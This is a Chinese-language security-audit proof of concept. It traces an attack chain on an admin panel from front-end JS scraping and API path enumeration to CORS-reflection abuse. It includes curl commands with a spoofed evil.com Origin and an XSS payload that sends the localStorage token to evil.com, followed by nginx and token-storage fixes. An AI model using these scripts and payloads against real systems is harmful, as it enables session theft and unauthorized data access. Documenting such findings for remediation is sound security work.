# 接口枚举与 CORS 攻击链 POC

> 本文件记录一次真实安全审计中发现的攻击链：从前端 JS 反编译到 API 枚举，再到 CORS 跨域窃取数据的完整流程。

## 1. 场景

- 后台前端：`https://admin.target.com`
- 后端 API：`https://adminapi.target.com`
- 技术栈：React + UmiJS + Ant Design Pro 前端，go-zero 后端
- 认证：Token 存储在 `localStorage.token`，请求头 `Authorization: Bearer ***`
- 发现：登录接口 SQL 注入防住，但 CORS 配置对任意 Origin 反射且允许 Credentials

## 2. 攻击链

### 2.1 获取前端 JS 源码

```python
import requests, re

r = requests.get("https://admin.target.com/", timeout=10)
scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text)
print(scripts)
# ['/umi.xxxxx.js']

js = requests.get(f"https://admin.target.com{scripts[0]}", timeout=30).text
```

### 2.2 从 JS 提取关键信息

```python
# API 基地址
print(re.search(r'baseURL\s*[:=]\s*["\']([^"\']+)["\']', js).group(1))
# https://adminapi.target.com

# Token 存储位置
print(re.search(r'(localStorage|sessionStorage)\.getItem\(["\']([^"\']*token[^"\']*)["\']\)', js))
# localStorage.getItem("token")

# 提取所有 /api/ 路径
api_paths = list(set(re.findall(r'"/api/[a-zA-Z0-9/_-]+"', js)))
print(api_paths)
```

### 2.3 枚举后端接口

前端路由推断出的后端 API 路径：

```python
import requests

base = "https://adminapi.target.com"
candidates = [
    "/api/sys/user/list",
    "/api/sys/user/info",
    "/api/sys/user/page",
    "/api/sys/user/modifyPassword",
    "/api/sys/role/list",
    "/api/sys/menu/list",
    "/api/sys/dept/list",
    "/api/sys/dict/list",
    "/api/sys/config/list",
    "/api/sys/upload",
    "/api/sys/log/list",
    "/api/login/outLogin",
]

for path in candidates:
    try:
        r = requests.get(base + path, timeout=8, allow_redirects=False)
        if r.status_code != 404:
            print(f"[{r.status_code}] {path}")
    except Exception as e:
        pass
```

### 2.4 CORS 验证（关键：测真实请求，不只 OPTIONS）

```bash
# 预检请求可能反射 Origin
curl -i -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  https://adminapi.target.com/api/sys/user/login

# 真实 POST 请求才是判断标准
curl -i -X POST \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"userName":"test","password":"test"}' \
  https://adminapi.target.com/api/sys/user/login

# 登录后接口测试（需要受害者 Token）
curl -i -X GET \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer <stolen_token>" \
  https://adminapi.target.com/api/sys/user/info
```

### 2.5 XSS 窃取 Token 的 POC

如果目标系统存在 XSS 漏洞（如用户昵称、备注、反馈内容），攻击者注入：

```html
<script>
fetch('https://evil.com/steal?token=' + encodeURIComponent(localStorage.getItem('token')))
</script>
```

然后攻击者用窃取的 Token 调用：

```js
fetch('https://adminapi.target.com/api/sys/user/info', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer ' + stolenToken
  }
})
```

## 3. 修复建议

### 3.1 CORS 白名单（nginx 层）

```nginx
map $http_origin $cors_origin {
    default "";
    "https://admin.target.com" $http_origin;
    "https://m.target.com" $http_origin;
}

server {
    location /api/ {
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
            return 204;
        }
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        proxy_pass http://backend;
    }
}
```

### 3.2 Token 存储加固

- 将 Token 改为 HttpOnly Cookie，JS 不可读取
- 或使用短期 Access Token + 刷新 Token 机制
- 如果必须存 localStorage，严格做 CSP 和 XSS 防护

### 3.3 生产环境移除调试工具

- 移除 vConsole、eruda
- 移除 sourcemap
- 关闭 React 开发者工具在生产环境的使用

## 4. 注意事项

- 接口枚举应直接请求后端域名，前端 SPA 的 fallback 会返回 200 混淆判断
- OPTIONS 预检反射 Origin 不代表真正可利用，必须测试真实请求
- 攻击链的核心是：CORS 配置 + Token 存储方式 + 业务接口认证
